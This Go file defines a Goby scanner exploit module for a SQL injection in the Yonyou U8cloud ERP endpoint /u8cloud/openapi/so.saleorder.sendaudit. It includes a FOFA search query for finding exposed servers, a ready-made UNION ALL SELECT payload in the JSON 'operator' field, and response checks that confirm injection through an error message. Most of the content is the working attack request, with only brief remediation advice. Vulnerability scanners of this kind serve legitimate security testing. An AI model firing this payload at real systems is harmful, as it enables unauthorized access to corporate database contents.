package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "用友U8cloud /u8cloud/openapi/so.saleorder.sendaudit SQL 注入漏洞",
  "Description": "<p>用友U8cloud是用友网络科技股份有限公司面向成长型与集团型企业推出的企业云ERP平台，覆盖财务管理、供应链管理、销售管理、协同办公等核心业务场景，支持企业在云端进行多组织、多业务流程的一体化管理。用友U8cloud /u8cloud/openapi/so.saleorder.sendaudit 接口存在SQL注入漏洞，攻击者可获取数据库敏感信息。<br></p>",
  "Product": "用友U8cloud",
  "Homepage": "https://www.yonyou.com/",
  "DisclosureDate": "2026-07-14",
  "PostTime": "2026-07-14",
  "Author": "heqiming@baimaohui.net",
  "FofaQuery": "body=\"请下载新版UClient\" && title=\"U8C\"",
  "GobyQuery": "body=\"请下载新版UClient\" && title=\"U8C\"",
  "Level": "2",
  "Impact": "<p>攻击者可利用该漏洞执行恶意SQL语句，获取数据库中的敏感信息，造成数据泄露。<br></p>",
  "Recommendation": "<p>建议厂商尽快修复该漏洞，临时缓解措施包括：限制接口访问来源，对用户输入进行严格校验和过滤，使用参数化查询或预编译语句，并部署Web应用防火墙进行防护。<br></p>",
  "References": [],
  "Is0day": false,
  "HasExp": false,
  "ExpParams": [],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/u8cloud/openapi/so.saleorder.sendaudit?appcode=esn&isEncrypt=N",
        "follow_redirect": false,
        "header": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data_type": "text",
        "data": "{\"operator\":\"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT('yyu8','{{{rand1}}}'),'u8yy'),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- a\",\"pk_corp\":\"1\",\"keys\":[\"1\"]}"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "invalid UFDate: yyu8{{{rand1}}}u8yy",
            "bz": ""
          }
        ]
      },
      "SetVariable": [
        "vulurl|fixedhostinfo|variable|{{{fixedhostinfo}}}/u8cloud/openapi/so.saleorder.sendaudit"
      ]
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/u8cloud/openapi/so.saleorder.sendaudit?appcode=esn&isEncrypt=N",
        "follow_redirect": false,
        "header": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data_type": "text",
        "data": "{\"operator\":\"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT('yyu8','{{{rand1}}}'),'u8yy'),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- a\",\"pk_corp\":\"1\",\"keys\":[\"1\"]}"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "id": 0,
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "id": 1,
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "invalid UFDate: yyu8{{{rand1}}}u8yy",
            "bz": ""
          }
        ]
      },
      "SetVariable": [
        "output|define|variable|{{{lastbody}}}"
      ]
    }
  ],
  "Tags": ["SQL注入"],
  "VulType": ["SQL注入"],
  "CVEIDs": [""],
  "CNNVD": [""],
  "CNVD": [""],
  "CVSSScore": "7.5",
  "Translation": {
    "CN": {
      "Name": "用友U8cloud /u8cloud/openapi/so.saleorder.sendaudit SQL 注入漏洞",
      "Product": "用友U8cloud",
      "Description": "<p>用友U8cloud是用友网络科技股份有限公司面向成长型与集团型企业推出的企业云ERP平台，覆盖财务管理、供应链管理、销售管理、协同办公等核心业务场景，支持企业在云端进行多组织、多业务流程的一体化管理。用友U8cloud /u8cloud/openapi/so.saleorder.sendaudit 接口存在SQL注入漏洞，攻击者可获取数据库敏感信息。<br></p>",
      "Recommendation": "<p>建议厂商尽快修复该漏洞，临时缓解措施包括：限制接口访问来源，对用户输入进行严格校验和过滤，使用参数化查询或预编译语句，并部署Web应用防火墙进行防护。<br></p>",
      "Impact": "<p>攻击者可利用该漏洞执行恶意SQL语句，获取数据库中的敏感信息，造成数据泄露。<br></p>",
      "VulType": ["SQL注入"],
      "Tags": ["SQL注入"]
    },
    "EN": {
      "Name": "Yonyou U8cloud /u8cloud/openapi/so.saleorder.sendaudit SQL Injection Vulnerability",
      "Product": "Yonyou-U8cloud",
      "Description": "<p>Yonyou U8cloud is an enterprise cloud ERP platform developed by Yonyou Network Technology Co., Ltd. for growing and group enterprises. It covers core business scenarios such as financial management, supply chain management, sales management, and collaborative office, and supports integrated cloud-based multi-organization and multi-process management. The /u8cloud/openapi/so.saleorder.sendaudit interface in Yonyou U8cloud has a SQL injection vulnerability that may allow attackers to obtain sensitive database information.<br></p>",
      "Recommendation": "<p>Users are advised to apply vendor patches as soon as possible. Temporary mitigations include restricting access to the interface, strictly validating and filtering user input, using parameterized queries or prepared statements, and deploying a web application firewall.<br></p>",
      "Impact": "<p>Attackers can exploit this vulnerability to execute malicious SQL statements and obtain sensitive information from the database, resulting in data leakage.<br></p>",
      "VulType": ["SQL Injection"],
      "Tags": ["SQL Injection"]
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
  "Variables": {
    "rand1": "define|variable|{{{rand|str|8}}}"
  },
  "VariablesOrder": ["rand1"],
  "EditType": "fast"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
